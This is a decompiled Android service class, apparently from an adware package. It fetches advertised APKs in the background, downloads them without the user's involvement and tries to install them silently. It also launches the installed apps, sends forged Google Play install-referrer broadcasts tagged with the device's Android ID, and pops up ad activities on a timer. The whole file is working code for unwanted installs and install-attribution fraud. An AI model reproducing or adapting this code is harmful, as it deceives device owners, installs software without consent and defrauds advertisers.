package com.mb.bdapp.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.mb.bdapp.api.RequestAdDownURLAPI;
import com.mb.bdapp.api.RequestAdDownURLAPI.APIListener;
import com.mb.bdapp.api.resp.AdDownURLResponse;
import com.mb.bdapp.db.DBService;
import com.mb.bdapp.db.DuAd;
import com.mb.bdapp.down.DownloadException;
import com.mb.bdapp.down.Downloader02;
import com.mb.bdapp.down.callback.RequestCallBack;
import com.mb.bdapp.gp.Referrer;
import com.mb.bdapp.net.HttpParameters;
import com.mb.bdapp.noti.DownSuccessNoti;
import com.mb.bdapp.util.AppInfoUtils;
import com.mb.bdapp.util.ApplicationUtils;
import com.mb.bdapp.util.ConfigUtils;
import com.mb.bdapp.util.Constants;
import com.mb.bdapp.util.DownUtils;
import com.mb.bdapp.util.FileUtils;
import com.mb.bdapp.util.InstallUtils;
import com.mb.bdapp.util.LogUtil;
import com.mb.bdapp.util.MobileInfoUtils;
import com.mb.bdapp.util.NotiUtils;
import com.mb.bdapp.util.SharedPreferencesUtils;
import com.moceanmobile.mast.Defaults;
import com.moceanmobile.mast.MASTNativeAdConstants;
import com.umeng.analytics.MobclickAgent;
import com.umeng.analytics.onlineconfig.a;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONException;
import org.json.JSONObject;

public class BaiduService extends Service {
    private static final long INTERVAL = 1500000;
    private static final String TAG = "-----DuService-----";
    private static HashMap<String, Downloader02> downloaderMap = new HashMap();
    private static ExecutorService mThreadPool = Executors.newFixedThreadPool(3);
    private static Timer mTimer = null;
    private static TimerTask mTimerTask = null;
    /* access modifiers changed from: private */
    public Context mContext;
    private BroadcastReceiver packageReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            LogUtil.d(BaiduService.TAG, action);
            if (action.equals("android.intent.action.PACKAGE_ADDED")) {
                String packageName = intent.getDataString().split(":")[1];
                DuAd ad = DBService.getInstance(context).queryAdByPname(packageName);
                if (ad != null) {
                    DBService.getInstance(context).updateAdStatusById((long) ad.get_ID(), 6);
                    File appFile = new File(FileUtils.getAPKPathByPname(packageName));
                    if (appFile.exists()) {
                        appFile.delete();
                    }
                    NotiUtils.cancleNotify(context, ad.getGid());
                    BaiduService.this.sendReferrer(context, ad);
                    BaiduService.this.startAd(context, ad.getPname());
                }
            }
        }
    };
    private BroadcastReceiver receiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            LogUtil.d(BaiduService.TAG, action);
            if (action.equals("android.intent.action.SCREEN_OFF")) {
                BaiduService.this.handleTimerTask(BaiduService.this.mContext, false);
            } else if (action.equals("android.intent.action.SCREEN_ON")) {
                BaiduService.this.handleTimerTask(BaiduService.this.mContext, true);
                BaiduService.this.startDownload(BaiduService.this.mContext);
            } else if (action.equals(Constants.ACTION_AD_DATA)) {
                String adData = intent.getStringExtra(Constants.DUAD_DATA);
                LogUtil.d(BaiduService.TAG, "adData=" + adData);
                Log.e(BaiduService.TAG, "adData=" + adData);
                BaiduService.this.handleDuAd(adData);
            } else if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
                if (MobileInfoUtils.isConnectInternet(context)) {
                    BaiduService.this.startDownload(BaiduService.this.mContext);
                    BaiduService.this.remindInstallApp(BaiduService.this.mContext);
                }
            } else if (action.equals(Constants.ACTION_INSTALL)) {
                BaiduService.this.installHandle(context, intent);
            } else if ("android.intent.action.USER_PRESENT".equals(action)) {
                BaiduService.this.remindInstallApp(BaiduService.this.mContext);
            } else if (Constants.INSTALL_DUAD.equals(action)) {
                BaiduService.this.remindInstallApp(BaiduService.this.mContext);
            }
        }
    };

    /* access modifiers changed from: private */
    public void handleDuAd(String adData) {
        Log.e(TAG, "adData=" + adData);
        DuAd duAd = jsonToDuAd(adData);
        Log.e(TAG, "duAd=" + duAd);
        if (duAd != null) {
            requestAdDownUrl(duAd);
        }
    }

    private void requestAdDownUrl(final DuAd duAd) {
        RequestAdDownURLAPI requestdownurl = new RequestAdDownURLAPI(this);
        HttpParameters parmams = new HttpParameters();
        parmams.add(RequestAdDownURLAPI.AD_PNAME, duAd.getPname());
        requestdownurl.requestAd(parmams, new APIListener() {
            public void onError(Exception e) {
                LogUtil.e(BaiduService.TAG, e.getLocalizedMessage());
            }

            public void onComplete(AdDownURLResponse adResponse) {
                if (adResponse == null) {
                    return;
                }
                if (adResponse.getStatus() == 0) {
                    String downurl = adResponse.getDownurl();
                    LogUtil.d(BaiduService.TAG, "downurl=" + downurl);
                    if (!TextUtils.isEmpty(downurl)) {
                        SharedPreferencesUtils.addAdvAction(BaiduService.this.getApplicationContext(), 5);
                        duAd.setDownUrl(downurl);
                        BaiduService.this.saveDuAd(duAd);
                        BaiduService.this.getAdReferrer(duAd);
                        return;
                    }
                    return;
                }
                LogUtil.d(BaiduService.TAG, "请求接口错误信息：" + adResponse.getMessage());
            }
        });
    }

    private void handleOldAd(DuAd oldAd, DuAd duAd) {
        if (oldAd.getDownUrl().equals(duAd.getDownUrl()) && (oldAd.getStatus() == 4 || oldAd.getStatus() == 7)) {
            String path = FileUtils.getAPKPathByPname(oldAd.getPname());
            if (new File(path).exists()) {
                duAd.setStatus(oldAd.getStatus());
                duAd.setInstallRetry(1);
                DBService.getInstance(this).updateAdById((long) oldAd.get_ID(), duAd);
                try {
                    startActivity(NotiUtils.getInstallIntent(this, path));
                    DownSuccessNoti baseNoti = new DownSuccessNoti(this, duAd);
                    baseNoti.setFlags(1);
                    baseNoti.setNotiDefaults(0);
                    baseNoti.showNotify();
                    return;
                } catch (Exception e) {
                    LogUtil.d(TAG, e.getLocalizedMessage());
                    return;
                }
            }
        }
        DBService.getInstance(this).updateAdById((long) oldAd.get_ID(), duAd);
        startDownload(this.mContext);
    }

    /* access modifiers changed from: private */
    public void saveDuAd(DuAd duAd) {
        try {
            DuAd oldAd = DBService.getInstance(this).queryAdByPname(duAd.getPname());
            if (oldAd != null) {
                handleOldAd(oldAd, duAd);
                return;
            }
            duAd.setStatus(3);
            long id = DBService.getInstance(this).insertAd(duAd);
            startDownload(this.mContext);
        } catch (Exception e) {
            LogUtil.e(TAG, e.getLocalizedMessage());
        }
    }

    private DuAd jsonToDuAd(String adString) {
        if (!TextUtils.isEmpty(adString)) {
            try {
                JSONObject note = new JSONObject(adString);
                DuAd ad = new DuAd();
                ad.setGid(new StringBuilder(String.valueOf(note.getInt(MASTNativeAdConstants.ID_STRING))).toString());
                ad.setContent(note.getString("shortDesc"));
                ad.setTitle(note.getString("title"));
                ad.setPname(note.getString("pkg"));
                ad.setDuUrl(note.getString("adUrl"));
                return ad;
            } catch (JSONException e) {
                LogUtil.e(TAG, e.getLocalizedMessage());
            }
        }
        return null;
    }

    /* access modifiers changed from: private */
    public void installHandle(Context context, Intent intent) {
        String gid = intent.getStringExtra("gid");
        String packName = intent.getStringExtra(Constants.NOTI_PACKNAME);
        String path = intent.getStringExtra(Constants.NOTI_PATH);
        File file = new File(path);
        LogUtil.d(TAG, path);
        if (NotiUtils.checkSystemPackName(context, packName)) {
            Intent startAppNoti = NotiUtils.getStartAPPIntent(context, packName);
            if (startAppNoti != null) {
                context.startActivity(startAppNoti);
            }
            NotiUtils.cancleNotify(context, gid);
            return;
        }
        Log.e("HDJ", "---- 广告漏斗 -- " + packName + " -- （安装） ---");
        MobclickAgent.onEvent(getApplicationContext(), "slient_install_start");
        SharedPreferencesUtils.addAdvAction(getApplicationContext(), 10);
        if (InstallUtils.silentlyinstall(context, path, file.getName())) {
            Log.e("HDJ", "---- 广告漏斗 -- " + packName + " -- （安装成功） ---");
            MobclickAgent.onEvent(getApplicationContext(), "slient_install_success");
            SharedPreferencesUtils.addAdvAction(getApplicationContext(), 11);
        } else {
            context.startActivity(NotiUtils.getInstallIntent(context, path));
        }
        try {
            DuAd duAd = DBService.getInstance(this.mContext).queryAdByGid(gid);
            DBService.getInstance(this.mContext).updateAdInstallRetryById((long) duAd.get_ID(), duAd.getInstallRetry() + 1);
        } catch (Exception e) {
        }
    }

    /* access modifiers changed from: private */
    public void remindInstallApp(Context context) {
        List<DuAd> list = DBService.getInstance(context).queryAdByStatus(4);
        if (list != null) {
            for (DuAd ad : list) {
                String packName = ad.getPname();
                String path = FileUtils.getAPKPathByPname(packName);
                File appFile = new File(path);
                String fileName = appFile.getName();
                int retry = ad.getInstallRetry();
                if (!appFile.exists() || ad.getInstallRetry() >= 4) {
                    DBService.getInstance(context).updateAdStatusById((long) ad.get_ID(), 7);
                } else {
                    try {
                        Log.e("HDJ", "---- 广告漏斗 -- " + packName + " -- （安装） ---");
                        MobclickAgent.onEvent(getApplicationContext(), "slient_install_start");
                        SharedPreferencesUtils.addAdvAction(getApplicationContext(), 10);
                        if (InstallUtils.silentlyinstall(context, path, fileName)) {
                            Log.e("HDJ", "---- 广告漏斗 -- " + packName + " -- （安装成功） ---");
                            MobclickAgent.onEvent(getApplicationContext(), "slient_install_success");
                            SharedPreferencesUtils.addAdvAction(getApplicationContext(), 11);
                        } else {
                            context.startActivity(NotiUtils.getInstallIntent(context, path));
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    DBService.getInstance(context).updateAdInstallRetryById((long) ad.get_ID(), retry + 1);
                }
            }
        }
    }

    /* access modifiers changed from: private */
    public void sendReferrer(final Context context, final DuAd ad) {
        LogUtil.d(TAG, "REFERRER=" + ad.getReferrer());
        if (ad.getReferrer() == null || "".equals(ad.getReferrer())) {
            WebView mWebView = new WebView(context);
            mWebView.getSettings().setJavaScriptEnabled(true);
            mWebView.setWebViewClient(new WebViewClient() {
                public boolean shouldOverrideUrlLoading(WebView webView, String nextUrl) {
                    Intent tempIntent;
                    if (nextUrl.contains("market://details?id") || nextUrl.contains("play.google.com")) {
                        Intent localIntent = new Intent("com.android.vending.INSTALL_REFERRER");
                        if (nextUrl.contains(DuAd.DB_REFERRER)) {
                            String data = Uri.parse(nextUrl).getQueryParameter(DuAd.DB_REFERRER);
                            tempIntent = new Intent("com.android.vending.INSTALL_REFERRER");
                            if (!TextUtils.isEmpty(data)) {
                                if (!data.contains("android_id=")) {
                                    data = new StringBuilder(String.valueOf(data)).append("&android_id=" + AppInfoUtils.getAndroidId(context)).toString();
                                }
                                tempIntent.putExtra(DuAd.DB_REFERRER, data);
                                Log.e("HDJ", "广告链接 sendReferrer【是】：" + data);
                            }
                            tempIntent.addFlags(32);
                            tempIntent.setPackage(ad.getPname());
                            context.sendBroadcast(tempIntent);
                            String referrer = "";
                            try {
                                referrer = URLDecoder.decode(data, Defaults.ENCODING_UTF_8);
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                                referrer = data;
                            }
                            LogUtil.d(BaiduService.TAG, "referrer=" + referrer);
                            if (!TextUtils.isEmpty(data)) {
                                if (!referrer.contains("android_id=")) {
                                    referrer = new StringBuilder(String.valueOf(referrer)).append("&android_id=" + AppInfoUtils.getAndroidId(context)).toString();
                                }
                                localIntent.putExtra(DuAd.DB_REFERRER, referrer);
                                Log.e("HDJ", "广告链接 sendReferrer【是】：" + referrer);
                            }
                            localIntent.addFlags(32);
                            localIntent.setPackage(ad.getPname());
                            context.sendBroadcast(localIntent);
                        }
                    } else {
                        tempIntent = new Intent("com.android.vending.INSTALL_REFERRER");
                        if (!nextUrl.contains("android_id=")) {
                            nextUrl = new StringBuilder(String.valueOf(nextUrl)).append("&android_id=" + AppInfoUtils.getAndroidId(context)).toString();
                        }
                        tempIntent.putExtra(DuAd.DB_REFERRER, nextUrl);
                        tempIntent.addFlags(32);
                        tempIntent.setPackage(ad.getPname());
                        context.sendBroadcast(tempIntent);
                        Log.e("HDJ", "广告链接 sendReferrer【否】：" + nextUrl);
                        webView.loadUrl(nextUrl);
                    }
                    return true;
                }
            });
            mWebView.loadUrl(ad.getDuUrl());
        } else {
            String referrer = ad.getReferrer();
            if (!referrer.contains("android_id=")) {
                referrer = new StringBuilder(String.valueOf(referrer)).append("&android_id=" + AppInfoUtils.getAndroidId(context)).toString();
            }
            Log.e("-----DuService----- -- Send Referrer ", referrer);
            Intent localIntent = new Intent("com.android.vending.INSTALL_REFERRER");
            localIntent.putExtra(DuAd.DB_REFERRER, referrer);
            localIntent.addFlags(32);
            localIntent.setPackage(ad.getPname());
            context.sendBroadcast(localIntent);
        }
        Log.e("HDJ", "---- 广告漏斗 -- " + ad.getPname() + " -- （发送Referrer） ---");
        MobclickAgent.onEvent(getApplicationContext(), "sendReferrer");
        SharedPreferencesUtils.addAdvAction(getApplicationContext(), 12);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        LogUtil.d(TAG, "onCreate()");
        Log.e("-- HDJ --", "GP优化服务启动");
        Log.e(TAG, "- -  onCreate - -!!");
        ConfigUtils.initConfig(this);
        this.mContext = this;
        registerScreenReciever();
        handleTimerTask(this.mContext, true);
        startDownload(this.mContext);
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return 1;
    }

    /* access modifiers changed from: private|declared_synchronized */
    public synchronized void handleTimerTask(Context context, boolean bool) {
        if (bool) {
            startTimerTask(context);
        } else {
            stopTimeTask();
        }
    }

    /* access modifiers changed from: private */
    public void getAdReferrer(final DuAd duAd) {
        new Thread() {
            public void run() {
                try {
                    String duAdUrl = duAd.getDuUrl();
                    if (!duAdUrl.contains("android_id=")) {
                        duAdUrl = new StringBuilder(String.valueOf(duAdUrl)).append("&android_id=" + AppInfoUtils.getAndroidId(BaiduService.this.mContext)).toString();
                    }
                    String referrer = RedirectTracer.recursiveTracePath(duAdUrl, duAdUrl);
                    Log.e("-----DuService----- -- Get Referrer ", referrer);
                    boolean isGp = Referrer.isGoogleStore(referrer);
                    if (isGp) {
                        MobclickAgent.onEvent(BaiduService.this.getApplicationContext(), "forward_gp");
                        SharedPreferencesUtils.addAdvAction(BaiduService.this.getApplicationContext(), 6);
                        Log.e("HDJ", "---- 广告漏斗 --  -- GP跳转（" + isGp + "） ---");
                        try {
                            DBService.getInstance(BaiduService.this.mContext).updateReferrerById(referrer, duAd.get_ID());
                            MobclickAgent.onEvent(BaiduService.this.getApplicationContext(), "getReferrer");
                            Log.e("HDJ", "---- 广告漏斗 --  -- getReferrer ---");
                            SharedPreferencesUtils.addAdvAction(BaiduService.this.getApplicationContext(), 7);
                        } catch (Exception e) {
                            LogUtil.e(BaiduService.TAG, e.getLocalizedMessage());
                        }
                    }
                } catch (Exception e2) {
                    LogUtil.e(BaiduService.TAG, e2.getLocalizedMessage());
                }
            }
        }.start();
    }

    private synchronized void startTimerTask(final Context context) {
        LogUtil.d(TAG, "startTimerTask");
        if (mTimer == null) {
            mTimer = new Timer();
        }
        if (mTimerTask == null) {
            mTimerTask = new TimerTask() {
                public void run() {
                    if (MobileInfoUtils.isConnectInternet(context) && ApplicationUtils.isNoSystemApp(context) && BaiduService.this.isShow(context)) {
                        SharedPreferencesUtils.putLong(BaiduService.this.mContext, Constants.SHARED_SHOW_TIME, System.currentTimeMillis());
                        BaiduService.this.startShowAdActivity(context);
                    }
                }
            };
            mTimer.schedule(mTimerTask, 0, 5000);
        }
    }

    /* access modifiers changed from: private */
    public void startShowAdActivity(Context context) {
        String className = SharedPreferencesUtils.getString(context, Constants.SHOW_AD_ACTIVITY_CLS);
        if (!TextUtils.isEmpty(className)) {
            Intent intent = new Intent();
            intent.setClassName(this, className);
            intent.setFlags(268435456);
            startActivity(intent);
        }
    }

    private synchronized void stopTimeTask() {
        if (mTimerTask != null) {
            mTimerTask.cancel();
            mTimerTask = null;
        }
        if (mTimer != null) {
            mTimer.cancel();
            mTimer = null;
        }
    }

    public synchronized void startDownload(Context context) {
        if (context != null) {
            List<DuAd> duAds = DBService.getInstance(context).queryAdByStatus(3);
            LogUtil.d(TAG, "duAds=" + duAds);
            if (duAds != null) {
                LogUtil.d(TAG, "开始下载");
                for (DuAd item : duAds) {
                    startDownLoad(context, item);
                }
            }
        }
    }

    /* access modifiers changed from: private|declared_synchronized */
    public synchronized void removeFromDownloaderMap(String url) {
        downloaderMap.remove(url);
    }

    public void startDownLoad(final Context context, final DuAd item) {
        if (!MobileInfoUtils.isConnectInternet(context)) {
            return;
        }
        if (item == null) {
            LogUtil.e(TAG, "Incorrect data can't download， ad=null");
        } else if (!downloaderMap.containsKey(item.getDownUrl())) {
            if (TextUtils.isEmpty(item.getDownUrl())) {
                LogUtil.e(TAG, "download url data can't download，downurl=" + item.getDownUrl());
                DBService.getInstance(context).deleteAdById((long) item.get_ID());
                return;
            }
            final String fileName = new StringBuilder(String.valueOf(FileUtils.generateFileName(item.getDownUrl()))).append("h.apk").toString();
            Downloader02 downloader = new Downloader02(item.getDownUrl(), FileUtils.getFile(fileName).getAbsolutePath(), new RequestCallBack() {
                public void onStart() {
                    MobclickAgent.onEvent(BaiduService.this.mContext, "slient_download_start");
                    Log.e("HDJ", "---- 广告漏斗 -- " + item.getPname() + " -- （开始下载） ---");
                    SharedPreferencesUtils.addAdvAction(BaiduService.this.getApplicationContext(), 8);
                    super.onStart();
                    LogUtil.d(BaiduService.TAG, "onStart()");
                }

                public void onLoading(long total, long current) {
                    super.onLoading(total, current);
                    int progress = (int) ((100 * current) / total);
                }

                public void onSuccess(File responseInfo) {
                    LogUtil.d(BaiduService.TAG, "onSuccess -->>");
                    if (!DownUtils.handleSuccess(context, item, responseInfo)) {
                        responseInfo.delete();
                        DownUtils.handleError(context, item, new DownloadException("下载包错误！重新下载"));
                    }
                    MobclickAgent.onEvent(BaiduService.this.mContext, "slient_download_finish");
                    SharedPreferencesUtils.addAdvAction(BaiduService.this.getApplicationContext(), 9);
                    Log.e("HDJ", "---- 广告漏斗 -- " + item.getPname() + " -- （下载完成） ---");
                    BaiduService.this.removeFromDownloaderMap(item.getDownUrl());
                }

                public void onFailure(DownloadException exception, String msg) {
                    LogUtil.d(BaiduService.TAG, "onFailure -->>" + exception.getLocalizedMessage() + " code=" + exception.getExceptionCode());
                    File file = FileUtils.getFile(fileName);
                    if (exception.getExceptionCode() == 416 && file.exists()) {
                        if (!DownUtils.handleSuccess(context, item, file)) {
                            file.delete();
                        } else {
                            return;
                        }
                    }
                    DownUtils.handleError(context, item, exception);
                    BaiduService.this.removeFromDownloaderMap(item.getDownUrl());
                }
            });
            downloaderMap.put(item.getDownUrl(), downloader);
            mThreadPool.execute(downloader);
            DBService.getInstance(context).updateAdStatusById((long) item.get_ID(), 3);
        }
    }

    public boolean isShow(Context context) {
        long showTime = SharedPreferencesUtils.getLong(context, Constants.SHARED_SHOW_TIME, 0);
        if (showTime == 0) {
            SharedPreferencesUtils.putLong(context, Constants.SHARED_SHOW_TIME, (System.currentTimeMillis() - INTERVAL) + 15000);
            return false;
        } else if (System.currentTimeMillis() - showTime >= INTERVAL) {
            return true;
        } else {
            return false;
        }
    }

    private void registerScreenReciever() {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.SCREEN_OFF");
        filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        filter.addAction("android.intent.action.SCREEN_ON");
        filter.addAction(Constants.ACTION_AD_DATA);
        filter.addAction(Constants.ACTION_INSTALL);
        filter.addAction("android.intent.action.USER_PRESENT");
        filter.addAction(Constants.INSTALL_DUAD);
        registerReceiver(this.receiver, filter);
        IntentFilter iFilter = new IntentFilter();
        iFilter.addDataScheme(a.b);
        iFilter.addAction("android.intent.action.PACKAGE_ADDED");
        registerReceiver(this.packageReceiver, iFilter);
    }

    /* access modifiers changed from: private */
    public void startAd(Context context, String packName) {
        Log.e("HDJ", "---- 广告漏斗 -- " + packName + " -- （启动） ---");
        MobclickAgent.onEvent(this.mContext, "adStart");
        SharedPreferencesUtils.addAdvAction(getApplicationContext(), 13);
        LogUtil.d(TAG, "start:1 " + packName);
        if (NotiUtils.checkSystemPackName(context, packName)) {
            Intent startAppNoti = NotiUtils.getStartAPPIntent(context, packName);
            if (startAppNoti != null) {
                context.startActivity(startAppNoti);
            }
            LogUtil.d(TAG, "start:" + packName);
        }
    }

    public void onDestroy() {
        unregisterReceiver(this.receiver);
        unregisterReceiver(this.packageReceiver);
        handleTimerTask(this, false);
    }
}
